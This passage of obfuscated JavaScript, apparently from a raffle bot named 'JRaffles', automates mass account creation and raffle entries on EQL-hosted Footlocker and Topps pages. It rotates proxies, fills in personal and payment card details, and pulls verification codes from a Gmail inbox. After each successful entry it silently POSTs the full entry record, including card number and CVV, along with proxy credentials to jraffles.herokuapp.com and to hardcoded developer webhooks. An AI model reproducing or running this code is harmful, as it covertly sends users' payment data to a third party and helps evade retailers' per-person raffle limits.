                        _0x4df74a[_0x4de0d8]['Password'] == '' && (_0x4df74a[_0x4de0d8]['Password'] = 'JRaffles23!');
                        if (_0x120b49['useRandomProxy'] = ![])
                            var _0x4f368d = _0x22b3e1[_0x4de0d8]['split'](':');
                        else
                            var _0x12d93f = Math['round'](Math['random']() * (_0x22b3e1['length'] - 0x1)), _0x4f368d = _0x22b3e1[_0x12d93f]['split'](':');
                        var _0x597809;
                        try {
                            _0x597809 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4f368d[0x0] + ':' + _0x4f368d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x597809 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4f368d[0x0] + ':' + _0x4f368d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3a78b1 = await _0x597809['newPage']();
                            await _0x3a78b1['authenticate']({
                                'username': '' + _0x4f368d[0x2],
                                'password': '' + _0x4f368d[0x3]
                            }), console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3a78b1['setRequestInterception'](!![]), _0x3a78b1['on']('request', _0x433054 => {
                                _0x433054['resourceType']() === 'image' || _0x433054['resourceType']() === 'font' || _0x433054['resourceType']() === 'media' ? _0x433054['abort']() : _0x433054['continue']();
                            });
                            try {
                                await _0x3a78b1['goto']('' + _0x3600f7);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2121c3(0x3e8), await _0x3a78b1['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x3a78b1['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x2121c3(0x3e8), _0x4df74a[_0x4de0d8]['Url']['includes']('en-GB') ? await _0x3a78b1['click']('li[data-value=\x22UK\x20' + _0x4df74a[_0x4de0d8]['Size'] + '\x20/\x20US\x20' + (Number(_0x4df74a[_0x4de0d8]['Size']) + 0x1) + '\x22]') : await _0x3a78b1['click']('li[data-value=\x22EU\x20' + _0x4df74a[_0x4de0d8]['Size'] + '\x22]');
                                } catch {
                                    await _0x3a78b1['click']('#productQuantity'), await _0x2121c3(0x3e8), await _0x3a78b1['click']('li[data-value=\x22' + (Number(_0x4df74a[_0x4de0d8]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x4df74a[_0x4de0d8]['Size']);
                            }
                            await _0x2121c3(0x6a4);
                            try {
                                await _0x3a78b1['select']('.PhoneInputCountrySelect', _0x4df74a[_0x4de0d8]['Country']);
                            } catch {
                            }
                            await _0x3a78b1['type']('#email', '' + _0x4df74a[_0x4de0d8]['Email']), await _0x2121c3(0x352), await _0x3a78b1['waitForSelector']('#password'), await _0x3a78b1['type']('#password', '' + _0x4df74a[_0x4de0d8]['Password']), await _0x2121c3(0x352), await _0x3a78b1['type']('#phone', '' + _0x4df74a[_0x4de0d8]['Phone']), await _0x2121c3(0x352);
                            const _0x42669a = await _0x3a78b1['$']('#title\x20>\x20label');
                            await _0x2121c3(0x12c);
                            _0x42669a && await _0x42669a['click']();
                            await _0x3a78b1['type']('#firstName', '' + _0x4df74a[_0x4de0d8]['FirstName']), await _0x2121c3(0x352), await _0x3a78b1['type']('#lastName', '' + _0x4df74a[_0x4de0d8]['LastName']), await _0x2121c3(0x352);
                            _0x4df74a[_0x4de0d8]['Url']['includes']('footlocker.de') ? await _0x3a78b1['type']('#birthdate', _0x398a3b(0xa, 0x1c) + '.' + _0x398a3b(0xa, 0xc) + '.' + _0x398a3b(0x7c6, 0x7d3)) : await _0x3a78b1['type']('#birthdate', _0x398a3b(0xa, 0x1c) + '-' + _0x398a3b(0xa, 0xc) + '-' + _0x398a3b(0x7c6, 0x7d3));
                            await _0x2121c3(0x352), await _0x3a78b1['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x4df74a[_0x4de0d8]['Url']['includes']('en-GB') && await _0x3a78b1['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x2121c3(0x1f4), await _0x2121c3(0x5dc);
                            if (!_0x3600f7['includes']('footlocker'))
                                try {
                                    await _0x3a78b1['click']('#country');
                                    const _0x3a5759 = await _0x3a78b1['$']('li[data-value=\x22' + _0x4df74a[_0x4de0d8]['Country'] + '\x22]');
                                    await _0x3a5759['click'](), await _0x3a5759['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x2121c3(0x3e8);
                            if (!_0x4df74a[_0x4de0d8]['Url']['includes']('en-GB')) {
                                await _0x3a78b1['click']('#stateAutocomplete'), await _0x2121c3(0x5dc);
                                try {
                                    const _0x515132 = await _0x3a78b1['$x']('//li[text()=\x22' + _0x4df74a[_0x4de0d8]['State'] + '\x22]');
                                    await _0x515132[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x2121c3(0x3e8), await _0x2121c3(0x1f4);
                            if (_0x4df74a[_0x4de0d8]['Url']['includes']('topps')) {
                                await _0x3a78b1['click']('#stateAutocomplete'), await _0x2121c3(0x5dc);
                                try {
                                    const _0x509ca1 = await _0x3a78b1['$x']('//li[text()=\x22' + _0x4df74a[_0x4de0d8]['State'] + '\x22]');
                                    await _0x509ca1[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            await _0x2121c3(0x3e8), await _0x3a78b1['type']('#address1', _0x4df74a[_0x4de0d8]['Address1'] + '\x20' + _0x4df74a[_0x4de0d8]['HouseNumber']), await _0x2121c3(0x1f4), await _0x3a78b1['type']('#address2', '' + _0x4df74a[_0x4de0d8]['Address2']), await _0x2121c3(0x1f4), await _0x3a78b1['type']('#city', '' + _0x4df74a[_0x4de0d8]['City']), await _0x2121c3(0x1f4), await _0x3a78b1['type']('#postcode', '' + _0x4df74a[_0x4de0d8]['Zip']), await _0x2121c3(0x3e8), await _0x3a78b1['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2121c3(0x3e8), console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x23fb06 = await _0x3a78b1['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x23fb06 && (await _0x3a78b1['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3a78b1['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3a78b1['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2121c3(0x4b0), await _0x3a78b1['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2121c3(0x1f4), await _0x3a78b1['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['CardNumber']), await _0x2121c3(0x320), await _0x3a78b1['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3a78b1['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3a78b1['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['ExpiryDate']), await _0x2121c3(0x4b0), await _0x3a78b1['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3a78b1['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3a78b1['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['CVV']), await _0x2121c3(0x226), await _0x3a78b1['type']('input[name=\x22postalCode\x22]', '' + _0x4df74a[_0x4de0d8]['Zip']), await _0x2121c3(0x226));
                            const _0x315651 = await _0x3a78b1['$']('.__PrivateStripeElement');
                            _0x315651 && (await _0x2121c3(0x1f4), await _0x3a78b1['click']('.__PrivateStripeElement'), await _0x3a78b1['click']('.__PrivateStripeElement'), await _0x3a78b1['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['CardNumber']), await _0x3a78b1['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['ExpiryDate']), await _0x3a78b1['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['CVV']));
                            await _0x2121c3(0x226), await _0x3a78b1['click']('#paymentConsent'), await _0x2121c3(0x226), await _0x3a78b1['click']('#termsConsent'), await _0x2121c3(0x2bc), console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x3a78b1['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2121c3(0x2710);
                            try {
                                await _0x3a78b1['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x2121c3(0xbb8), await _0x3a78b1['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x87c22a => _0x87c22a['click']()), await _0x3a78b1['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x15f44d => _0x15f44d['click']());
                            } catch {
                            }
                            try {
                                await _0x3a78b1['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x18867e = await _0x3a78b1['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x18867e) {
                                    _0x190b67['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x4df74a[_0x4de0d8]['Email'] + ',' + _0x4df74a[_0x4de0d8]['Password'] + ',' + _0x4df74a[_0x4de0d8]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x4d2478() {
                                var _0x17ae88, _0x2ed461 = ![];
                                for (var _0x5ef447 = 0x0; _0x5ef447 < 0x18; _0x5ef447++) {
                                    async function _0x9a5a74() {
                                        var _0x48837e = new _0x548918({
                                            'user': _0x120b49['masterMail'],
                                            'password': _0x120b49['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x23bb2b(_0x4b01f2) {
                                            _0x48837e['openBox']('INBOX', ![], _0x4b01f2);
                                        }
                                        _0x48837e['once']('ready', function () {
                                            console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x23bb2b(function (_0x4a4aac, _0x273b56) {
                                                console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x4a4aac)
                                                    throw _0x4a4aac;
                                                _0x48837e['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x43ffc9, _0x1dc0da) {
                                                    if (!_0x1dc0da || !_0x1dc0da['length'])
                                                        console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x48837e['end']();
                                                    else {
                                                        var _0x3baba3 = _0x48837e['seq']['fetch'](_0x1dc0da, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x3baba3['on']('message', function (_0x34814c, _0x53c65a) {
                                                            var _0x30ea65 = '(#' + _0x53c65a + ')\x20';
                                                            _0x34814c['on']('body', function (_0x50c434, _0x574223) {
                                                                _0x26bd25(_0x50c434, (_0x40bc5b, _0x250397) => {
                                                                    if (_0x250397['subject']['includes']('code')) {
                                                                        const _0x4c2ef9 = _0x250397['text']['split']('\x0a\x0a')[0x3], _0x403f51 = _0x4c2ef9['split']('\x0a')[0x1];
                                                                        _0x17ae88 = _0x403f51;
                                                                    }
                                                                });
                                                            }), _0x34814c['once']('end', function () {
                                                            });
                                                        }), _0x3baba3['once']('error', function (_0x82ef8) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x3baba3['once']('end', function () {
                                                            _0x48837e['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x48837e['once']('error', function (_0x49fe24) {
                                            console['log'](_0x136200['red'](_0x49fe24['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2ed461 = !![];
                                        }), _0x48837e['once']('end', async function () {
                                        }), _0x48837e['connect']();
                                    }
                                    _0x9a5a74(), await _0x2121c3(0x1388);
                                    if (_0x17ae88)
                                        return _0x17ae88;
                                    if (_0x2ed461)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5ef447 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x4d2478(), await _0x2121c3(0x1f4), await _0x3a78b1['type']('#code', '' + code), await _0x2121c3(0x3e8), await _0x3a78b1['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x1e66bc => _0x1e66bc['click']()), await _0x3a78b1['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x3a78b1['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x4df74a[_0x4de0d8]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x190b67['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x4df74a[_0x4de0d8]['Email'] + ',' + _0x4df74a[_0x4de0d8]['Password'] + ',' + _0x4df74a[_0x4de0d8]['Phone']), _0x183baf = 'no', _0x1ded45(_0x4df74a[_0x4de0d8], _0x28259b);
                            var _0x5c9c24 = await _0x12b988(_0x4df74a[_0x4de0d8], _0x28259b, 'dev', ![]), _0x2f3a17 = await _0x12b988(_0x4df74a[_0x4de0d8], _0x28259b, 'pub', ![]);
                            let _0x13c452 = _0x4df74a[_0x4de0d8];
                            try {
                                prxdata = {
                                    'username': _0x380ae8['replace']('#', ''),
                                    'module': _0x28259b['name'],
                                    'entrydata': JSON['stringify'](_0x13c452),
                                    'proxy': '' + _0x22b3e1[_0x4de0d8]
                                };
                                var _0x32389b = JSON['stringify'](prxdata);
                                let _0x23b63f = { 'headers': { 'content-type': 'application/json' } };
                                await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x32389b, _0x23b63f);
                            } catch (_0x4454d1) {
                            }
                            const _0x482fa9 = {
                                'succesDEVMSG': { 'embeds': [_0x5c9c24] },
                                'succesPUBMSG': { 'embeds': [_0x2f3a17] }
                            };
                            try {
                                _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x482fa9['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x482fa9['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x442434, _0x482fa9['succesPUBMSG']);
                            } catch (_0x4037d7) {
                                console['log'](_0x136200['yellow'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4037d7));
                            }
                        } catch (_0x1c4e8b) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20' + _0x1c4e8b)), _0x36f921 = '' + _0x1c4e8b;
                            var _0x53768b = await _0x12b988(_0x4df74a[_0x4de0d8], _0x28259b, 'dev', !![], _0x36f921), _0x5c9c24 = await _0x12b988(_0x4df74a[_0x4de0d8], _0x28259b, 'dev', ![]), _0x2f3a17 = await _0x12b988(_0x4df74a[_0x4de0d8], _0x28259b, 'pub', ![]);
                            const _0x2787e2 = {
                                'succesDEVMSG': { 'embeds': [_0x5c9c24] },
                                'succesPUBMSG': { 'embeds': [_0x2f3a17] }
                            };
                            _0x2787e2['errorDEV'] = { 'embeds': [_0x53768b] };
                            _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x2787e2['errorDEV']);
                            await _0x5f1090(_0x32737e, _0x2787e2['errorDEV']);
                            if (!_0x183baf == 'no')
                                _0x183baf = 'yes';
                        } finally {
                            _0x597809 && _0x597809['close']();
                            if (_0x183baf == 'yes' && _0x554fb1 != 0x5) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x554fb1 + '\x20/\x205)')), _0x4de0d8 = _0x4de0d8 - 0x1, _0x554fb1 = _0x554fb1 + 0x1;
                                continue;
                            }
                            _0x183baf == 'yes' && _0x554fb1 >= 0x5 && (_0x17abd2(_0x4df74a[_0x4de0d8], _0x28259b), _0x183baf = 'no', _0x554fb1 = 0x0), console['log']('Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                        }
                    } else {
                        const _0x538dc0 = '' + _0x4df74a[_0x4de0d8]['Url'];
                        if (_0x183baf != 'yes')
                            var _0x183baf = '', _0x554fb1 = 0x0;
                        if (_0x4df74a[_0x4de0d8]['Email'] == '' || _0x4df74a[_0x4de0d8]['FirstName'] == '' || _0x4df74a[_0x4de0d8]['LastName'] == '') {
                            console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x4df74a[_0x4de0d8]['Password'] == '' && (_0x4df74a[_0x4de0d8]['Password'] = 'JRaffles23!');
                        if (_0x120b49['useRandomProxy'] = ![])
                            var _0x4f368d = _0x22b3e1[_0x4de0d8]['split'](':');
                        else
                            var _0x12d93f = Math['round'](Math['random']() * (_0x22b3e1['length'] - 0x1)), _0x4f368d = _0x22b3e1[_0x12d93f]['split'](':');
                        var _0x597809;
                        try {
                            _0x597809 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4f368d[0x0] + ':' + _0x4f368d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x597809 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4f368d[0x0] + ':' + _0x4f368d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3eaf38 = await _0x597809['newPage']();
                            await _0x3eaf38['authenticate']({
                                'username': '' + _0x4f368d[0x2],
                                'password': '' + _0x4f368d[0x3]
                            }), console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3eaf38['setRequestInterception'](!![]), _0x3eaf38['on']('request', _0x40e822 => {
                                _0x40e822['resourceType']() === 'image' || _0x40e822['resourceType']() === 'font' || _0x40e822['resourceType']() === 'media' ? _0x40e822['abort']() : _0x40e822['continue']();
                            }), await _0x3eaf38['goto'](_0x538dc0), await _0x3eaf38['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button');
                            let _0x1e2864 = await _0x3eaf38['$']('#gatsby-focus-wrapper\x20>\x20div:nth-child(3)\x20>\x20div\x20>\x20div\x20>\x20span\x20>\x20div\x20>\x20button.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButtonBase-root.css-78bdfl');
                            if (_0x1e2864)
                                await _0x1e2864['click']();
                            await _0x2121c3(0x7d0), await _0x3eaf38['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x2121c3(0x7d0), await _0x3eaf38['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x3eaf38['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x2121c3(0x3e8), await _0x3eaf38['waitForSelector']('#email'), console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x3eaf38['type']('#email', '' + _0x4df74a[_0x4de0d8]['Email']), await _0x2121c3(0x352), await _0x3eaf38['waitForSelector']('#password'), await _0x3eaf38['type']('#password', '' + _0x4df74a[_0x4de0d8]['Password']), await _0x2121c3(0x352), await _0x3eaf38['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2121c3(0x1388);
                            if (!_0x4df74a[_0x4de0d8]['Url']['includes']('footlocker') && !_0x4df74a[_0x4de0d8]['Url']['includes']('topps'))
                                await _0x3eaf38['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x57c075 = await _0x3eaf38['$']('#productQuantity'), _0x5f370a = await _0x3eaf38['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x5f370a && !_0x57c075) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x183baf = 'no';
                                continue;
                            }
                            if (_0x5f370a) {
                                await _0x3eaf38['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x4df74a[_0x4de0d8]['Url']['includes']('en-GB') ? await _0x3eaf38['click']('li[data-value=\x22UK\x20' + _0x4df74a[_0x4de0d8]['Size'] + '\x20/\x20US\x20' + (Number(_0x4df74a[_0x4de0d8]['Size']) + 0x1) + '\x22]') : await _0x3eaf38['click']('li[data-value=\x22EU\x20' + _0x4df74a[_0x4de0d8]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x4df74a[_0x4de0d8]['Size']);
                                }
                            }
                            _0x57c075 && (await _0x3eaf38['click']('#productQuantity'), await _0x2121c3(0x3e8), await _0x3eaf38['click']('li[data-value=\x22' + (Number(_0x4df74a[_0x4de0d8]['Size']) - 0x1) + '\x22]'));
                            await _0x2121c3(0x3e8), await _0x2121c3(0x1f4);
                            const _0x10a15b = await _0x3eaf38['$']('#title\x20>\x20label');
                            await _0x2121c3(0x12c);
                            _0x10a15b && await _0x10a15b['click']();
                            await _0x3eaf38['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x3eaf38['focus']('#postcode'), await _0x3eaf38['keyboard']['down']('Control'), await _0x3eaf38['keyboard']['press']('A'), await _0x3eaf38['keyboard']['up']('Control'), await _0x3eaf38['keyboard']['press']('Backspace'), await _0x3eaf38['keyboard']['type'](_0x4df74a[_0x4de0d8]['Zip']), await _0x2121c3(0x60e), await _0x3eaf38['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2121c3(0x3e8), console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x2121c3(0x1f4);
                            const _0x5e1f3d = await _0x3eaf38['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x5e1f3d && (await _0x3eaf38['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3eaf38['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3eaf38['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2121c3(0x4b0), await _0x3eaf38['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2121c3(0x1f4), await _0x3eaf38['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['CardNumber']), await _0x2121c3(0x320), await _0x3eaf38['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3eaf38['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['ExpiryDate']), await _0x2121c3(0x4b0), await _0x3eaf38['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3eaf38['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['CVV']), await _0x2121c3(0x226), await _0x3eaf38['type']('input[name=\x22postalCode\x22]', '' + _0x4df74a[_0x4de0d8]['Zip']), await _0x2121c3(0x226));
                            const _0x1818cf = await _0x3eaf38['$']('.__PrivateStripeElement');
                            _0x1818cf && (await _0x3eaf38['click']('#billingName'), await _0x3eaf38['click']('#billingName'), await _0x3eaf38['type']('#billingName', '' + _0x4df74a[_0x4de0d8]['NameOnCard']), await _0x2121c3(0x1f4), await _0x3eaf38['click']('.__PrivateStripeElement'), await _0x3eaf38['click']('.__PrivateStripeElement'), await _0x3eaf38['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['CardNumber']), await _0x3eaf38['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['ExpiryDate']), await _0x3eaf38['keyboard']['type']('' + _0x4df74a[_0x4de0d8]['CVV']));
                            await _0x2121c3(0x226), await _0x3eaf38['click']('#paymentConsent'), await _0x2121c3(0x226), await _0x3eaf38['click']('#termsConsent'), await _0x2121c3(0x2bc), console['log'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x3eaf38['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2121c3(0x2710);
                            try {
                                await _0x3eaf38['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x2121c3(0xbb8), await _0x3eaf38['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2f1d21 => _0x2f1d21['click']()), await _0x3eaf38['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2cdef9 => _0x2cdef9['click']());
                            } catch {
                            }
                            try {
                                await _0x3eaf38['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
